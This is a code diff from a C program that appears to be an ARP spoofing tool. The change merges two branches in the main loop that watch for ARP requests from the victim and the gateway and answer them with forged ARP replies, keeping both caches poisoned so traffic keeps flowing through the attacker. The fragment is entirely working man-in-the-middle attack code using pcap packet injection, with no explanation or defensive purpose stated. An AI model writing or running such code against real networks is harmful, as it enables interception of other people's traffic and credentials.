@@ -271,24 +271,15 @@ int main(int argc, char* argv[]) {
       if(pcap_sendpacket(handle , packet , packet_size)!=0) printf("Error with relay (target)");
     }
 
-    /* Send arp reply to sender again */
+    /* Send arp reply again */
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp sender(victim)'s request packet for recovery 
       && swap_word_endian(arp->oper) == ARP_OPER_REQ          // Is it arp request?
       &&!strcmp(arp->spa , ip_sender)
       &&!strcmp(arp->tpa , ip_target))
     {
-      printf("send arp reply packet to sender against recovery\n");
-      pcap_sendpacket(handle ,(unsigned char*)arp_reply_sender_packet , 42);      
-    }
-
-    /* Send arp reply to target again */
-    if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp target(gateway)'s request packet for recovery 
-      && swap_word_endian(arp->oper) == ARP_OPER_REQ          // Is it arp request?
-      &&!strcmp(arp->spa , ip_target)
-      &&!strcmp(arp->tpa , ip_sender))
-    {
-      printf("send arp reply packet to target against recovery\n");
-      pcap_sendpacket(handle ,(unsigned char*)arp_reply_target_packet , 42);      
+      printf("send arp reply packet to sender&target against recovery\n");
+      pcap_sendpacket(handle ,(unsigned char*)arp_reply_sender_packet , 42);   
+      pcap_sendpacket(handle ,(unsigned char*)arp_reply_target_packet , 42);    
     }
 
 
